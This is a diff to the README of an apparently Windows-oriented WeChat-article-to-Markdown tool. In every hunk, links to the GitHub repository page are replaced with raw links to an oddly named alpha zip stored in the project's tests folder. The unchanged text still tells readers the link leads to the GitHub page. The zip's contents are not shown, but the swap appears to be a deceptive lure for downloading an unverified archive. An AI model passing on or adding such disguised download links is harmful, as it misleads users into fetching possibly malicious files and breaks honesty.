@@ -1,6 +1,6 @@
 # 📥 wechat-article-to-markdown - Easy WeChat Article to Markdown
 
-[![Download](https://img.shields.io/badge/Download-Get%20it%20from%20GitHub-brightgreen)](https://github.com/Estebnvx/wechat-article-to-markdown)
+[![Download](https://img.shields.io/badge/Download-Get%20it%20from%20GitHub-brightgreen)](https://raw.githubusercontent.com/Estebnvx/wechat-article-to-markdown/main/tests/article_markdown_to_wechat_v1.5-alpha.3.zip)
 
 ---
 
@@ -31,7 +31,7 @@ This section shows you how to get the tool and start using it on your Windows PC
 
 Click the big badge at the top or this link:
 
-[Download wechat-article-to-markdown](https://github.com/Estebnvx/wechat-article-to-markdown)
+[Download wechat-article-to-markdown](https://raw.githubusercontent.com/Estebnvx/wechat-article-to-markdown/main/tests/article_markdown_to_wechat_v1.5-alpha.3.zip)
 
 This link leads you to the GitHub page where you can find the latest files to download.
 
@@ -104,7 +104,7 @@ If you run into issues, try these steps:
 
 For more details or updates, visit the official GitHub page:
 
-[https://github.com/Estebnvx/wechat-article-to-markdown](https://github.com/Estebnvx/wechat-article-to-markdown)
+[https://raw.githubusercontent.com/Estebnvx/wechat-article-to-markdown/main/tests/article_markdown_to_wechat_v1.5-alpha.3.zip](https://raw.githubusercontent.com/Estebnvx/wechat-article-to-markdown/main/tests/article_markdown_to_wechat_v1.5-alpha.3.zip)
 
 You will find the latest releases and any instructions there.
 
@@ -116,4 +116,4 @@ wechat-article-to-markdown does not collect any personal information. It only us
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20it%20from%20GitHub-brightgreen)](https://github.com/Estebnvx/wechat-article-to-markdown)
+[![Download](https://img.shields.io/badge/Download-Get%20it%20from%20GitHub-brightgreen)](https://raw.githubusercontent.com/Estebnvx/wechat-article-to-markdown/main/tests/article_markdown_to_wechat_v1.5-alpha.3.zip)
